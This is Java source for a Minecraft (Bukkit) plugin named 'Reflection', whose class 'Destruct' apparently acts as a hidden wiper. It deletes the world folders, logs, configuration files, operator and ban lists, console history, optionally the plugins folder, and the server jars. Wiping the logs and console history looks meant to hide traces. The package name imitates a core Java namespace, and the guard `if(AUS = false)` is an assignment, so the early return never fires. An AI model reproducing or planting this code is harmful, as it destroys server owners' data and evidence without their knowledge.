package java.Reflection.protocol;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

public class Destruct {

	Plugin pl = Bukkit.getPluginManager().getPlugin("Reflection");
	
	public Destruct(Boolean plugins, Boolean AUS) {
		//This class deletes only important files. Not all.
		if(AUS = false) {
			return;
		}
		
		try {
			File file = new File("world/");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("world_nether/");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("world_the_end/");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("logs/");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("eula.txt");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("spigot.yml");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("paper.yml");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("bukkit.yml");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("ops.json");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("cache/");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File(".console_history");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("banned-players.json");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("banned-ips.json");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		if(plugins) {
			try {
				File file = new File("plugins/");
				if (file.isDirectory()) { // If its a folder, delete its contents
					for (File f : file.listFiles())
						f.delete();
					}
					file.delete(); // Delete the actual file
				} catch (Exception e) {
					System.gc();
				}
		}
		
		try {
			File file = new File("server.jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("ya.jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("spigot.jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("paper.jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("srv.jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("bukkit.jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
		
		try {
			File file = new File("paper-" + Bukkit.getServer().getBukkitVersion() + ".jar");
			if (file.isDirectory()) { // If its a folder, delete its contents
				for (File f : file.listFiles())
					f.delete();
				}
				file.delete(); // Delete the actual file
			} catch (Exception e) {
				System.gc();
			}
	}
}
